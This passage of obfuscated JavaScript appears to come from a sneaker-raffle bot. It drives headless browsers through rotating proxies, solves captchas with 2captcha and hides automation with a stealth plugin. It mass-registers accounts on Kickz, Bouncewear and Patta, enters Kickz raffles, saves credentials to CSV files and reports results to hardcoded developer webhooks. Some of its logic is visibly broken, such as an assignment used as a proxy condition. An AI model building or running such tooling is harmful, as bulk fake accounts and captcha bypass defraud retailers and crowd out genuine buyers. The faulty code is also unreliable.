                _0x1dc284['resourceType']() === 'image' || _0x1dc284['resourceType']() === 'font' || _0x1dc284['resourceType']() === 'media' ? _0x1dc284['abort']() : _0x1dc284['continue']();
            }), await _0x487a87['goto'](_0x5a0c8c), await _0x238216(0xbb8), console['log'](_0x44cc98() + '\x20[' + _0x1297a8['name'] + ']\x20Task\x20' + (_0x17f739 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x487a87['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x487a87['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x487a87['waitForSelector']('#button-register'), await _0x238216(0x7d0), await _0x487a87['evaluate'](() => {
                const _0x548051 = document['querySelector']('#button-register');
                _0x548051['click']();
            }), console['log'](_0x44cc98() + '\x20[' + _0x1297a8['name'] + ']\x20Task\x20' + (_0x17f739 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x238216(0x1388), await _0x487a87['waitForSelector']('#customer_salutation'), await _0x487a87['select']('#customer_salutation', 'mr'), await _0x238216(0x7d0), await _0x487a87['waitForSelector']('#customer_firstname'), await _0x487a87['type']('#customer_firstname', '' + _0x16afaa[_0x17f739]['FirstName']), await _0x238216(0x352), await _0x487a87['waitForSelector']('#customer_lastname'), await _0x487a87['type']('#customer_lastname', '' + _0x16afaa[_0x17f739]['LastName']), await _0x238216(0x352), await _0x487a87['type']('#email-input', '' + _0x16afaa[_0x17f739]['Email']), await _0x238216(0x352), await _0x487a87['type']('#email-confirm-input', '' + _0x16afaa[_0x17f739]['Email']), await _0x238216(0x352), await _0x487a87['type']('#register-password', '' + _0x16afaa[_0x17f739]['Password']), await _0x238216(0x352), await _0x487a87['type']('#password-confirm', '' + _0x16afaa[_0x17f739]['Password']), await _0x238216(0x352), console['log'](_0x44cc98() + '\x20[' + _0x1297a8['name'] + ']\x20Task\x20' + (_0x17f739 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x487a87['click']('#consent'), await _0x238216(0x1f4);
            const _0x3660c7 = await _0x487a87['$']('div.inputErrorMsg.b-form_section-message');
            if (_0x3660c7) {
                console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x1297a8['name'] + ']\x20Task\x20' + (_0x17f739 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                continue;
            }
            await _0x487a87['click']('#buttonRegister');
            try {
                await _0x487a87['waitForSelector']('#verificationCode');
            } catch {
                throw new Error('Account\x20already\x20registered');
            }
            console['log'](_0xc5437b['yellow'](_0x44cc98() + '\x20[' + _0x1297a8['name'] + ']\x20Task\x20' + (_0x17f739 + 0x1) + '\x20:\x20Account\x20' + _0x16afaa[_0x17f739]['Email'] + '\x20Generated!')), console['log'](_0xc5437b['yellow'](_0x44cc98() + '\x20[' + _0x1297a8['name'] + ']\x20Task\x20' + (_0x17f739 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x16afaa[_0x17f739]['Email'])), await _0x238216(0x4b0);
            async function _0x1baf88() {
                console['log'](_0xc5437b['yellow'](_0x44cc98() + '\x20[' + _0x1297a8['name'] + ']\x20Task\x20' + (_0x17f739 + 0x1) + '\x20:\x20Paste\x20your\x20verification\x20code\x20here:'));
                var _0x5d6329 = await _0x1f5f6f['get']('Code');
                return _0x5d6329['Code'];
            }
            ;
            code = await _0x1baf88(), _0x238216(0x320), console['log'](_0x44cc98() + '\x20[' + _0x1297a8['name'] + ']\x20Task\x20' + (_0x17f739 + 0x1) + '\x20:\x20Verifying..'), await _0x487a87['type']('#verificationCode', code), await _0x238216(0x1f4), await _0x487a87['click']('#buttonVerify'), await _0x238216(0x190), await _0x487a87['click']('#buttonVerify'), await _0x238216(0x3e8);
            try {
                await _0x487a87['waitForSelector']('div.b-user_greeting'), console['log'](_0xc5437b['green'](_0x44cc98() + '\x20[' + _0x1297a8['name'] + ']\x20Task\x20' + (_0x17f739 + 0x1) + '\x20:\x20Account\x20' + _0x16afaa[_0x17f739]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x582c0f['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x16afaa[_0x17f739]['Email'] + ',' + _0x16afaa[_0x17f739]['Password'] + ','), console['log'](_0x44cc98() + '\x20[' + _0x1297a8['name'] + ']\x20Task\x20' + (_0x17f739 + 0x1) + '\x20:\x20Account\x20' + _0x16afaa[_0x17f739]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                try {
                    _0x5eb805['webhook'] != undefined && _0x5eb805['webhook'] != '' && await _0x4f7227(_0x5eb805['webhook'], _0x2051db['succesDEVMSG']);
                } catch {
                }
                await _0x4f7227(_0xd1db44, _0x2051db['succesDEVMSG']);
            } catch {
                console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x1297a8['name'] + ']\x20Task\x20' + (_0x17f739 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x1297a8['name'] + ']\x20Task\x20' + (_0x17f739 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
            }
        } catch (_0x291afb) {
            console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x1297a8['name'] + ']\x20Task\x20' + (_0x17f739 + 0x1) + '\x20:\x20' + _0x291afb)), _0x333e3d[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x333e3d[0x0]['description'] = '' + _0x291afb, await _0x4f7227(_0x11ec69, _0x597fdb), _0x3d5321 = 'yes';
        } finally {
            _0x366bc2 && _0x366bc2['close']();
            if (_0x3d5321 == 'yes' && _0x2ac7c1 != 0x5) {
                console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x1297a8['name'] + ']\x20Task\x20' + (_0x17f739 + 0x1) + '\x20:\x20Retrying')), _0x17f739 = _0x17f739 - 0x1, _0x2ac7c1 = _0x2ac7c1 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x5eb805['delay'] + '\x20ms'), await _0x238216(_0x5eb805['delay']);
        }
    }
}
async function _0x1b88bb(_0x3b4243, _0xc66bb7, _0x3b5d61) {
    _0x15c804['use'](_0x21b95f()), _0x15c804['use'](_0x1fbb4f({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5eb805['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x276b1a = 0x0; _0x276b1a < _0xc66bb7['length']; _0x276b1a++) {
        var _0x147f95, _0x351e87 = '', _0x189f31 = 0x0;
        _0x52fa74(_0x3b4243['name'] + '\x20Task\x20' + (_0x276b1a + 0x1) + '\x20/\x20' + _0xc66bb7['length'] + '\x20||\x20File:\x20' + _0x23f754 + '\x20Proxies:\x20' + _0x47660c);
        var _0x3c846b = [{
            'type': 'rich',
            'title': 'Succesful\x20Kickz\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x44a8dd
                },
                {
                    'name': 'Product',
                    'value': '' + _0xc66bb7[_0x276b1a]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0xc66bb7[_0x276b1a]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x5eb805['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x3cb81f
                }
            ]
        }], _0x4312e2 = await _0x5e2a41(_0xc66bb7[_0x276b1a], _0x3b4243, 'dev', ![]), _0x109941 = await _0x5e2a41(_0xc66bb7[_0x276b1a], _0x3b4243, 'pub', ![]);
        const _0x39fff3 = {
            'succesDEVMSG': { 'embeds': [_0x4312e2] },
            'succesPUBMSG': { 'embeds': [_0x109941] }
        };
        await _0x5c2071(_0xc66bb7, _0x276b1a);
        if (_0xc66bb7[_0x276b1a]['Email'] == '' || _0xc66bb7[_0x276b1a]['Password'] == '' || _0xc66bb7[_0x276b1a]['FirstName'] == '' || _0xc66bb7[_0x276b1a]['LastName'] == '') {
            console['log'](_0x44cc98() + '\x20[' + _0x3b4243['name'] + ']\x20Task\x20' + (_0x276b1a + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x5eb805['useRandomProxy'] = ![])
            var _0x1ad8c9 = _0x3b5d61[_0x276b1a]['split'](':');
        else
            var _0x569339 = Math['round'](Math['random']() * (_0x3b5d61['length'] - 0x1)), _0x1ad8c9 = _0x3b5d61[_0x569339]['split'](':');
        const _0x120ab0 = await _0x15c804['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x1ad8c9[0x0] + ':' + _0x1ad8c9[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0xfa35de = await _0x120ab0['newPage']();
            await _0xfa35de['authenticate']({
                'username': '' + _0x1ad8c9[0x2],
                'password': '' + _0x1ad8c9[0x3]
            }), console['log'](_0x44cc98() + '\x20[' + _0x3b4243['name'] + ']\x20Task\x20' + (_0x276b1a + 0x1) + '\x20:\x20Getting\x20Session'), await _0xfa35de['setRequestInterception'](!![]), _0xfa35de['on']('request', _0x41f34a => {
                _0x41f34a['resourceType']() === 'image' || _0x41f34a['resourceType']() === 'font' || _0x41f34a['resourceType']() === 'media' ? _0x41f34a['abort']() : _0x41f34a['continue']();
            }), await _0xfa35de['goto']('' + _0xc66bb7[_0x276b1a]['Url'], { 'waitUntil': 'networkidle2' }), await _0x238216(0x12c);
            try {
                await _0xfa35de['click']('a[title=\x22Sign\x20In\x22]');
            } catch {
                await _0xfa35de['click']('a[title=\x22sign\x20in\x22]');
            }
            console['log'](_0x44cc98() + '\x20[' + _0x3b4243['name'] + ']\x20Task\x20' + (_0x276b1a + 0x1) + '\x20:\x20Logging\x20in'), await _0xfa35de['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xfa35de['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xfa35de['waitForSelector']('#username'), await _0xfa35de['type']('#username', _0xc66bb7[_0x276b1a]['Email']), await _0xfa35de['waitForSelector']('#password'), await _0xfa35de['type']('#password', _0xc66bb7[_0x276b1a]['Password']), await _0x238216(0x190), await _0xfa35de['click']('#buttonSubmit'), await _0xfa35de['waitForSelector']('div.b-user_greeting'), console['log'](_0x44cc98() + '\x20[' + _0x3b4243['name'] + ']\x20Task\x20' + (_0x276b1a + 0x1) + '\x20:\x20Getting\x20Product'), await _0x238216(0x1f4), await _0xfa35de['goto']('' + _0xc66bb7[_0x276b1a]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x44cc98() + '\x20[' + _0x3b4243['name'] + ']\x20Task\x20' + (_0x276b1a + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0xc66bb7[_0x276b1a]['Size']);
            let _0x105662 = _0xc66bb7[_0x276b1a]['Size']['replace']('.5', '\x201/2');
            await _0xfa35de['click']('button[title=\x22' + _0x105662 + '\x22]'), await _0x238216(0x1f4);
            try {
                await _0xfa35de['click']('button[data-tau=\x22add_new_address\x22]');
            } catch {
            }
            await _0x238216(0x12c), console['log'](_0x44cc98() + '\x20[' + _0x3b4243['name'] + ']\x20Task\x20' + (_0x276b1a + 0x1) + '\x20:\x20Filling\x20Information'), await _0xfa35de['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x238216(0x12c), await _0xfa35de['type']('#dwfrm_raffle_addressFields_firstName', _0xc66bb7[_0x276b1a]['FirstName']), await _0x238216(0x12c), await _0xfa35de['type']('#dwfrm_raffle_addressFields_lastName', _0xc66bb7[_0x276b1a]['LastName']), await _0x238216(0x12c), await _0xfa35de['select']('#dwfrm_raffle_addressFields_country', _0xc66bb7[_0x276b1a]['Country']), await _0x238216(0x12c), await _0xfa35de['type']('#dwfrm_raffle_addressFields_city', _0xc66bb7[_0x276b1a]['City']), await _0x238216(0x12c);
            _0xc66bb7[_0x276b1a]['Postcode'] == undefined && (_0xc66bb7[_0x276b1a]['Postcode'] = _0xc66bb7[_0x276b1a]['Zip']);
            await _0xfa35de['type']('#dwfrm_raffle_addressFields_postalCode', _0xc66bb7[_0x276b1a]['Postcode']), await _0x238216(0x12c), await _0xfa35de['type']('#dwfrm_raffle_addressFields_address1', _0xc66bb7[_0x276b1a]['Address1']), await _0x238216(0x12c), await _0xfa35de['type']('#dwfrm_raffle_addressFields_address2', _0xc66bb7[_0x276b1a]['HouseNumber']), await _0x238216(0x12c), await _0xfa35de['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0xc66bb7[_0x276b1a]['Address2']), await _0x238216(0x12c), await _0xfa35de['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x238216(0x12c), await _0xfa35de['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0xc66bb7[_0x276b1a]['Follower']), await _0x238216(0x1f4), await _0xfa35de['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x238216(0x1f4), console['log'](_0x44cc98() + '\x20[' + _0x3b4243['name'] + ']\x20Task\x20' + (_0x276b1a + 0x1) + '\x20:\x20' + _0xc5437b['blue']('Awaiting\x20Paypal\x20Payment')), await _0xfa35de['click']('.b-paypal_button');
            try {
                await _0xfa35de['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), console['log'](_0xc5437b['green'](_0x44cc98() + '\x20[' + _0x3b4243['name'] + ']\x20Task\x20' + (_0x276b1a + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x5eb805['webhook'] != undefined && _0x5eb805['webhook'] != '' && await _0x4f7227(_0x5eb805['webhook'], _0x39fff3['succesDEVMSG']), await _0x238216(0xc8), await _0x4f7227(_0x57a1da, _0x39fff3['succesDEVMSG']), await _0x238216(0xc8), await _0x4f7227(_0xfe9ed6, _0x39fff3['succesPUBMSG']);
            } catch (_0x39d6cd) {
                console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x3b4243['name'] + ']\x20Task\x20' + (_0x276b1a + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x39d6cd)), _0x147f95 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x39d6cd;
                var _0x3afcf8 = await _0x5e2a41(_0xc66bb7[_0x276b1a], _0x3b4243, 'dev', !![], _0x147f95);
                _0x39fff3['errorDEV'] = { 'embeds': [_0x3afcf8] }, _0x5eb805['webhook'] != undefined && _0x5eb805['webhook'] != '' && await _0x4f7227(_0x5eb805['webhook'], _0x39fff3['errorDEV']), await _0x4f7227(_0x11ec69, _0x39fff3['errorDEV']);
            }
        } catch (_0x310cce) {
            console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x3b4243['name'] + ']\x20Task\x20' + (_0x276b1a + 0x1) + '\x20:\x20' + _0x310cce)), _0x147f95 = '' + _0x310cce;
            var _0x3afcf8 = await _0x5e2a41(_0xc66bb7[_0x276b1a], _0x3b4243, 'dev', !![], _0x147f95);
            _0x39fff3['errorDEV'] = { 'embeds': [_0x3afcf8] }, _0x5eb805['webhook'] != undefined && _0x5eb805['webhook'] != '' && await _0x4f7227(_0x5eb805['webhook'], _0x39fff3['errorDEV']), await _0x4f7227(_0x11ec69, _0x39fff3['errorDEV']), _0x351e87 = 'yes';
        } finally {
            _0x120ab0 && _0x120ab0['close']();
            if (_0x351e87 == 'yes' && _0x189f31 != 0x5) {
                console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x3b4243['name'] + ']\x20Task\x20' + (_0x276b1a + 0x1) + '\x20:\x20Retrying')), _0x276b1a = _0x276b1a - 0x1, _0x189f31 = _0x189f31 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x5eb805['AfewDelay'] + '\x20ms'), await _0x238216(_0x5eb805['AfewDelay']);
        }
    }
}
async function _0x4a89bf(_0x466cae, _0x949c47) {
    _0x15c804['use'](_0x21b95f()), _0x15c804['use'](_0x1fbb4f({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5eb805['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x1cf0fd = 0x0; _0x1cf0fd < bouncewear['length']; _0x1cf0fd++) {
        await _0x5c2071(bouncewear, _0x1cf0fd);
        if (bouncewear[_0x1cf0fd]['Email'] == '' || bouncewear[_0x1cf0fd]['Password'] == '' || bouncewear[_0x1cf0fd]['FirstName'] == '' || bouncewear[_0x1cf0fd]['LastName'] == '') {
            console['log'](_0x44cc98() + '\x20[' + _0x1159f2[taskModule]['name'] + ']\x20Task\x20' + (_0x1cf0fd + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x5eb805['useRandomProxy'] = ![])
            var _0x492019 = _0x4783a9()[_0x1cf0fd]['split'](':');
        else
            var _0x5fc2e3 = Math['round'](Math['random']() * (_0x4783a9()['length'] - 0x1)), _0x492019 = _0x4783a9()[_0x5fc2e3]['split'](':');
        const _0x10a093 = await _0x15c804['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x492019[0x0] + ':' + _0x492019[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x116eea = await _0x10a093['newPage']();
            await _0x116eea['authenticate']({
                'username': '' + _0x492019[0x2],
                'password': '' + _0x492019[0x3]
            }), console['log'](_0x44cc98() + '\x20[' + _0x949c47['name'] + ']\x20Task\x20' + (_0x1cf0fd + 0x1) + '\x20:\x20Getting\x20Session'), await _0x116eea['setRequestInterception'](!![]), _0x116eea['on']('request', _0x555b5e => {
                _0x555b5e['resourceType']() === 'image' || _0x555b5e['resourceType']() === 'font' || _0x555b5e['resourceType']() === 'media' ? _0x555b5e['abort']() : _0x555b5e['continue']();
            }), await _0x116eea['goto'](_0x466cae), await _0x238216(0xbb8), await _0x116eea['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x44cc98() + '\x20[' + _0x949c47['name'] + ']\x20Task\x20' + (_0x1cf0fd + 0x1) + '\x20:\x20Filling\x20information'), await _0x116eea['type']('#RegisterForm-FirstName', '' + bouncewear[_0x1cf0fd]['FirstName']), await _0x238216(0x226), await _0x116eea['type']('#RegisterForm-LastName', '' + bouncewear[_0x1cf0fd]['LastName']), await _0x238216(0x226), await _0x116eea['type']('#RegisterForm-email', '' + bouncewear[_0x1cf0fd]['Email']), await _0x238216(0x226), await _0x116eea['type']('#RegisterForm-password', '' + bouncewear[_0x1cf0fd]['Password']), await _0x238216(0x226), await _0x116eea['click']('#marketing'), console['log'](_0x44cc98() + '\x20[' + _0x949c47['name'] + ']\x20Task\x20' + (_0x1cf0fd + 0x1) + '\x20:\x20Submitting..'), await _0x116eea['$eval']('#RegisterForm', _0x3be1f9 => _0x3be1f9['submit']()), await _0x238216(0x1f40), console['log'](_0x44cc98() + '\x20[' + _0x949c47['name'] + ']\x20Task\x20' + (_0x1cf0fd + 0x1) + '\x20:\x20Solving\x20Captcha'), await _0x116eea['solveRecaptchas'](), await _0x116eea['click']('.shopify-challenge__button.btn');
            async function _0x559460() {
                for (var _0xaaefa4 = 0x0; _0xaaefa4 < 0x4; _0xaaefa4++) {
                    try {
                        console['log']('try'), await _0x116eea['waitForSelector']('.shopify-challenge__error', { 'timeout': 0x1388 }), console['log'](_0x44cc98() + '\x20[' + _0x949c47['name'] + ']\x20Task\x20' + (_0x1cf0fd + 0x1) + '\x20:\x20' + _0xc5437b['red']('Catpcha\x20failed,\x20retrying..')), await _0x116eea['solveRecaptchas'](), await _0x116eea['click']('.shopify-challenge__button.btn');
                    } catch {
                        console['log']('catch');
                        break;
                    }
                }
            }
            await _0x559460(), console['log'](_0x44cc98() + '\x20[' + _0x949c47['name'] + ']\x20Task\x20' + (_0x1cf0fd + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x238216(0x1f4);
            try {
                await _0x116eea['waitForSelector']('.featured-title'), await _0x238216(0x1f4), console['log'](_0xc5437b['green'](_0x44cc98() + '\x20[' + _0x949c47['name'] + ']\x20Task\x20' + (_0x1cf0fd + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x1cf0fd]['Email'] + '\x20Generated!')), _0x582c0f['appendFileSync']('../accounts/bouncewear.csv', '\x0a' + bouncewear[_0x1cf0fd]['Email'] + ',' + bouncewear[_0x1cf0fd]['Password']), console['log'](_0xc5437b['yellow'](_0x44cc98() + '\x20[' + _0x949c47['name'] + ']\x20Task\x20' + (_0x1cf0fd + 0x1) + '\x20:\x20Account\x20' + bouncewear[_0x1cf0fd]['Email'] + '\x20Saved\x20in\x20\x27accounts/bouncewear.csv\x27'));
            } catch (_0x2929f9) {
                console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x1159f2[taskModule]['name'] + ']\x20Task\x20' + (_0x1cf0fd + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x2929f9));
            }
        } catch (_0x31d0a0) {
            console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x1159f2[taskModule]['name'] + ']\x20Task\x20' + (_0x1cf0fd + 0x1) + '\x20:\x20' + _0x31d0a0));
        } finally {
            _0x10a093 && _0x10a093['close'](), console['log']('Waiting\x20for\x20' + _0x5eb805['delay'] + '\x20ms'), await _0x238216(_0x5eb805['delay']);
        }
    }
}
async function _0x3d7f35(_0x2dea55, _0x1e0248, _0x40c110, _0x677bf8) {
    _0x15c804['use'](_0x21b95f()), _0x15c804['use'](_0x1fbb4f({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5eb805['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0xbaa1a3 = 0x0; _0xbaa1a3 < _0x40c110['length']; _0xbaa1a3++) {
        var _0x38cf1f = [{
            'type': 'rich',
            'title': 'Succesful\x20Patta\x20Account\x20Generated',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x44a8dd
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x5eb805['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x3cb81f
                }
            ]
        }];
        const _0x22f150 = { 'embeds': _0x38cf1f };
        _0x52fa74(_0x1e0248['name'] + '\x20Task\x20' + (_0xbaa1a3 + 0x1) + '\x20/\x20' + _0x40c110['length'] + '\x20||\x20File:\x20' + _0x23f754 + '\x20Proxies:\x20' + _0x47660c), await _0x5c2071(_0x40c110, _0xbaa1a3);
        var _0x56f4ea = await _0x5e2a41(_0x40c110[_0xbaa1a3], _0x1e0248, 'acc', ![]);
        const _0x1ca6e4 = { 'succesDEVMSG': { 'embeds': [_0x56f4ea] } };
        if (_0x40c110[_0xbaa1a3]['Email'] == '' || _0x40c110[_0xbaa1a3]['FirstName'] == '' || _0x40c110[_0xbaa1a3]['LastName'] == '') {
            console['log'](_0x44cc98() + '\x20[' + _0x1159f2[taskModule]['name'] + ']\x20Task\x20' + (_0xbaa1a3 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x238216(0x7d0);
            continue;
        }
        (_0x40c110[_0xbaa1a3]['Password'] == '' || _0x40c110[_0xbaa1a3] == undefined) && _0x40c110[_0xbaa1a3]['Password'] == 'JRaffles23!';
        if (_0x5eb805['useRandomProxy'] = ![])
            var _0x573536 = _0x677bf8[_0xbaa1a3]['split'](':');
        else
            var _0xa3ee18 = Math['round'](Math['random']() * (_0x677bf8['length'] - 0x1)), _0x573536 = _0x677bf8[_0xa3ee18]['split'](':');
        const _0x1ffb77 = await _0x15c804['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x573536[0x0] + ':' + _0x573536[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x8425f7 = await _0x1ffb77['newPage']();
            await _0x8425f7['authenticate']({
                'username': '' + _0x573536[0x2],
                'password': '' + _0x573536[0x3]
            }), console['log'](_0x44cc98() + '\x20[' + _0x1e0248['name'] + ']\x20Task\x20' + (_0xbaa1a3 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x8425f7['setRequestInterception'](!![]), _0x8425f7['on']('request', _0x1147eb => {
                _0x1147eb['resourceType']() === 'image' || _0x1147eb['resourceType']() === 'font' || _0x1147eb['resourceType']() === 'media' ? _0x1147eb['abort']() : _0x1147eb['continue']();
            }), await _0x8425f7['goto'](_0x2dea55), await _0x238216(0xbb8), await _0x8425f7['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x44cc98() + '\x20[' + _0x1e0248['name'] + ']\x20Task\x20' + (_0xbaa1a3 + 0x1) + '\x20:\x20Filling\x20information'), await _0x8425f7['type']('#RegisterForm-FirstName', '' + _0x40c110[_0xbaa1a3]['FirstName']), await _0x238216(0x226), await _0x8425f7['type']('#RegisterForm-LastName', '' + _0x40c110[_0xbaa1a3]['LastName']), await _0x238216(0x226), await _0x8425f7['type']('#RegisterForm-email', '' + _0x40c110[_0xbaa1a3]['Email']), await _0x238216(0x226), await _0x8425f7['type']('#RegisterForm-password', '' + _0x40c110[_0xbaa1a3]['Password']), await _0x238216(0x226), console['log'](_0x44cc98() + '\x20[' + _0x1e0248['name'] + ']\x20Task\x20' + (_0xbaa1a3 + 0x1) + '\x20:\x20Submitting..'), await _0x8425f7['$eval']('#RegisterForm', _0x3ca04d => _0x3ca04d['submit']()), await _0x238216(0x1f40);
            try {
                await _0x8425f7['waitForSelector']('.home-page-grid__collection'), await _0x238216(0x1f4), console['log'](_0xc5437b['green'](_0x44cc98() + '\x20[' + _0x1e0248['name'] + ']\x20Task\x20' + (_0xbaa1a3 + 0x1) + '\x20:\x20Account\x20' + _0x40c110[_0xbaa1a3]['Email'] + '\x20Generated!')), _0x582c0f['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x40c110[_0xbaa1a3]['Email'] + ',' + _0x40c110[_0xbaa1a3]['Password']), console['log'](_0xc5437b['yellow'](_0x44cc98() + '\x20[' + _0x1e0248['name'] + ']\x20Task\x20' + (_0xbaa1a3 + 0x1) + '\x20:\x20Account\x20' + _0x40c110[_0xbaa1a3]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                try {
                    _0x5eb805['webhook'] != undefined && _0x5eb805['webhook'] != '' && await _0x4f7227(_0x5eb805['webhook'], _0x1ca6e4['succesDEVMSG']);
                } catch {
                }
                await _0x4f7227(_0xd1db44, _0x1ca6e4['succesDEVMSG']);
            } catch (_0x3fd6f4) {
                console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x1159f2[taskModule]['name'] + ']\x20Task\x20' + (_0xbaa1a3 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x3fd6f4));
            }
        } catch (_0x546a60) {
            console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x1159f2[taskModule]['name'] + ']\x20Task\x20' + (_0xbaa1a3 + 0x1) + '\x20:\x20' + _0x546a60));
        } finally {
            _0x1ffb77 && _0x1ffb77['close'](), console['log']('Waiting\x20for\x20' + _0x5eb805['delay'] + '\x20ms'), await _0x238216(_0x5eb805['delay']);
        }
    }
}
async function _0x395fc0(_0x3230f2, _0x10405e, _0x2fab9f, _0x409737) {
    _0x15c804['use'](_0x21b95f()), _0x15c804['use'](_0x1fbb4f({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5eb805['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x4ccd4b = 0x0; _0x4ccd4b < _0x2fab9f['length']; _0x4ccd4b++) {
        var _0x34fcc0, _0x2a68a1 = '', _0x2cbb58 = 0x0;
        _0x52fa74(_0x10405e['name'] + '\x20Task\x20' + (_0x4ccd4b + 0x1) + '\x20/\x20' + _0x2fab9f['length'] + '\x20||\x20File:\x20' + _0x23f754 + '\x20Proxies:\x20' + _0x47660c), await _0x5c2071(_0x2fab9f, _0x4ccd4b);
        if (_0x2fab9f[_0x4ccd4b]['Email'] == '' || _0x2fab9f[_0x4ccd4b]['Password'] == '' || _0x2fab9f[_0x4ccd4b]['FirstName'] == '' || _0x2fab9f[_0x4ccd4b]['LastName'] == '') {
            console['log'](_0x44cc98() + '\x20[' + _0x1159f2[taskModule]['name'] + ']\x20Task\x20' + (_0x4ccd4b + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x5eb805['useRandomProxy'] = ![])
            var _0x2fd26f = _0x409737[_0x4ccd4b]['split'](':');
        else
            var _0x7a1daa = Math['round'](Math['random']() * (_0x409737['length'] - 0x1)), _0x2fd26f = _0x409737[_0x7a1daa]['split'](':');
        const _0x4615b0 = await _0x15c804['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x2fd26f[0x0] + ':' + _0x2fd26f[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x3e367a = await _0x4615b0['newPage']();
            await _0x3e367a['authenticate']({
                'username': '' + _0x2fd26f[0x2],
                'password': '' + _0x2fd26f[0x3]
            }), console['log'](_0x44cc98() + '\x20[' + _0x10405e['name'] + ']\x20Task\x20' + (_0x4ccd4b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3e367a['setRequestInterception'](!![]), _0x3e367a['on']('request', _0x3701e8 => {
                _0x3701e8['resourceType']() === 'image' || _0x3701e8['resourceType']() === 'font' || _0x3701e8['resourceType']() === 'media' ? _0x3701e8['abort']() : _0x3701e8['continue']();
            }), await _0x3e367a['goto']('https://www.patta.nl/nl/account/login', {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
